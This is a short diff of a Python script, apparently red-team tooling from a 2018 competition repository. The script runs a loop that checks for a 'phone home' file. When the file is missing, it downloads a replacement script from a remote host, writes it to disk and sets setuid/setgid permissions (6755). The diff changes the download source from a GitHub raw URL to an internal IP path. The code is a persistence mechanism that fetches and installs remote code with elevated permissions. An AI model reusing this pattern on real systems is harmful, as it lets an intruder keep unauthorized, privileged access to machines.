@@ -25,7 +25,7 @@ while True:
     print("phone home file exists")
   else:
     print("Need to replace phone home script")
-    script = urllib2.urlopen("https://raw.githubusercontent.com/valinkrai/siu-red-team-2018/master/get-persist.py").read()
+    script = urllib2.urlopen("10.0.0.1/phonehomy.py").read()
     file = open(script_location, 'w')
     file.write(script)
     os.chmod(script_location , 6755) 
